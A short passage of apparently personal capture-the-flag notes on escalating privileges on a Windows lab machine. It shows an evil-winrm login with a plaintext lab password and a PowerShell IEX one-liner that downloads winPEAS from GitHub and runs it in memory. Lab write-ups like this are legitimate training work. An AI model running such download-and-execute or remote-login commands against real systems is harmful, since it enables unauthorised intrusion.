
Still no Root flag means we have to escalate our access now.
```
evil-winrm -u 'jorden' -p 'rainforest786' -i 10.10.10.179    
```

![[Pasted image 20241002184740.png]]


![[Pasted image 20241002185019.png]]


![[Pasted image 20241002185539.png]]

So what really stand out here is that it is a member of server operators.

Let's see how to run winpeas or privs check

SO we have to run powershell winpeas and it works (i.e. i wasted my time trying to run x86 and 64 and any)
```
powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
```

As we can see that we have access to sc
![[Pasted image 20241008072610.png]]

